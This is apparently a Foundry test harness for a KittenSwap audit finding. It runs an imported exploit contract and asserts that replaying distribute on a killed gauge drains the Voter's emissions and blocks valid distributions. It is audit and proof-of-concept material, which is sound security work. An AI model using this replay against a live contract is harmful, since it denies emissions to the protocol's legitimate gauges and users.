// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, Voter, Minter, Kitten, MarkerToken, AlgebraGauge, StandardGauge} from "./61951-h-01-repeated-distributions-for-killed-gauges-can-block-vali.sol";

// KittenSwap H-01 (finding 61951): Voter._distribute never sets es.distributed=true
// for a killed gauge, so distribute(killedAlgebraGauge) can be replayed every call,
// draining the Voter's KITTEN back to the minter until valid distributions for the
// live gauges revert. Period example: 100 KITTEN, votes a=45 / b=45 / killed c=10.
contract Finding61951Test is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    function test_exploit_killedGaugeReplay_blocksValidDistributions() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("improperly drained (KITTEN)", e.improperlyDrained());
        emit log_named_uint("valid distribution blocked", e.validDistributionBlocked() ? 1 : 0);
        emit log_named_uint("harm at SINK (marker)", e.marker().balanceOf(SINK));

        // The killed-gauge replay drained exactly the 90e18 emissions owed to the
        // live gauges (a=45 + b=45), and their valid distribution is now blocked.
        assertEq(e.improperlyDrained(), 90 ether, "replay drained the Voter's 90e18");
        assertTrue(e.validDistributionBlocked(), "valid distribution should revert");

        // The Voter has been fully drained; the minter received the whole 100e18 back.
        assertEq(e.kitten().balanceOf(address(e.voter())), 0, "Voter drained to zero");
        assertEq(e.kitten().balanceOf(address(e.minter())), 100 ether, "minter clawed back all emissions");

        // DoS/griefing harm magnitude recorded at the SINK marker.
        assertEq(e.marker().balanceOf(SINK), 90 ether, "blocked-emissions magnitude at SINK");
    }
}
